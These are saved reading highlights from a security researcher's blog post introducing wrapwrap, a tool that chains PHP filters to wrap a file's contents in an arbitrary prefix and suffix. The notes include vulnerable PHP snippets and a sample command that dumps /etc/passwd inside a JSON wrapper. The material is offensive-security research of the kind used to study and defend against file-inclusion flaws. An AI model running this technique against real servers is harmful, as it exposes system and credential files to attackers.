---
author: Charles Fol
aliases:
  - "Introducing Wrapwrap: Using PHP Filters to Wrap a File With a Prefix and Suffix"
  - wrapwrap
tags:
  - readwise/articles
url: https://www.ambionics.io/blog/wrapwrap-php-filters-suffix.html
created: 2024-01-18
---
# Introducing Wrapwrap: Using PHP Filters to Wrap a File With a Prefix and Suffix

![rw-book-cover](https://www.ambionics.io/images/wrapwrap-php-filters-suffix/wrapwrap-php-filters-suffix.png)

tags:: #Tools

> `wrapwrap` is available on our [GitHub repository](https://github.com/ambionics/wrapwrap).
> [View Highlight](https://read.readwise.io/read/01hmf1mgjwaz49j6z4ng8er45s)


`wrapwrap` marks another improvement to the [PHP wrappers and filters](../../Dev,%20ICT%20&%20Cybersec/Web%20&%20Network%20Hacking/File%20Inclusion%20(LFI%20&%20RFI).md#PHP%20wrappers%20and%20filters) saga. Adding arbitrary prefixes to resources using `php://filter` is nice, but you can now **add an arbitrary suffix** as well, allowing you to wrap PHP resources into any structure.
> [View Highlight](https://read.readwise.io/read/01hmf1mdry737635ny1wa1xzag)

This allows to exploit vulnerable code like:
```php
$data = file_get_contents($_POST['url']);
$data = json_decode($data);
echo $data->message;
```

or

```php
$config = parse_ini_file($_POST['config']);

echo $config["config_value"];
```

To obtain the contents of some file, we'd like to have: `{"message":"<file contents>"}`. This can be done using:
```sh
$ ./wrapwrap.py /etc/passwd '{"message":"' '"}' 1000 [*] Dumping 1008 bytes from /etc/passwd. [+] Wrote filter chain to chain.txt (size=705031).

{"message":"root:x:0:0:root:/root:/bin/bash=0Adaemon:..."}

```


